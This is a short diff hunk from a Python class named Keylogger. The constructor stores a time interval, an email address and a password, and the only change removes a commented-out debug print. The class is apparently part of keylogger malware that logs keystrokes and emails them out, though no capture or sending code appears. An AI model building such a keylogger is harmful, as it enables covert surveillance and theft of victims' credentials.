@@ -14,7 +14,6 @@ class Keylogger:
         self.interval = time_interval
         self.email = email
         self.password = password
-        # print ("We are in constructor method")
 
     def append_to_log(self, string):
         self.log = self.log + string
